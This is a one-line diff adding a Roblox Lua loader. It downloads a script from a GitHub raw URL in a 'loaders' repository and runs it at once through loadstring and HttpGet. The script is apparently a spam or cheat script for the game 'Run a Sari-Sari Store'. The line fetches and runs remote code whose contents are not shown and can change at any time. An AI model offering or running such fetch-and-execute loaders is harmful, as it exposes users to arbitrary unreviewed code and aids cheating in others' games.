@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/run-a-sari-sari-store-spam6-vqtzxbl3o7f396.lua"))()
